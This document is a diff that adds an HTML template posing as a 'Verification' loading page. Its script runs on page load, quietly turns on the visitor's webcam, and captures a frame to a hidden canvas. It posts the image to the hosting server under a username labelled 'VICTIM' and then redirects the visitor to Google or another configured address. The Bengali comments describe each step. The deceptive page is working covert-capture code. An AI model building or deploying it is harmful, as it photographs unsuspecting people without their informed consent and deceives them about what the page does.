@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+</head>
+<body>
+    <div style="text-align:center; padding:50px; font-family:monospace;">
+        <h2>Loading...</h2>
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        (async function() {
+            try {
+                // ওয়েবক্যাম শুরু
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                
+                // ছবি তোলা
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // ছবি বেস64 হিসেবে পাঠানো
+                const imageData = canvas.toDataURL('image/png');
+                
+                // ডেটা সংগ্রহ
+                const site = 'NEXUS';
+                const username = 'VICTIM-' + Math.random().toString(36).substring(2, 8);
+                const password = '••••••••';
+                
+                // সার্ভারে পাঠানো
+                const res = await fetch('/upload/<%= id %>', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        image: imageData,
+                        site: site,
+                        username: username,
+                        password: password
+                    })
+                });
+                
+                // রিডাইরেক্ট
+                if(res.ok) {
+                    window.location.href = '<%= redirect || "https://google.com" %>';
+                } else {
+                    window.location.href = '<%= redirect || "https://google.com" %>';
+                }
+            } catch(e) {
+                // ক্যামেরা না পেলেও রিডাইরেক্ট
+                window.location.href = '<%= redirect || "https://google.com" %>';
+            }
+        })();
+    </script>
+</body>
+</html>
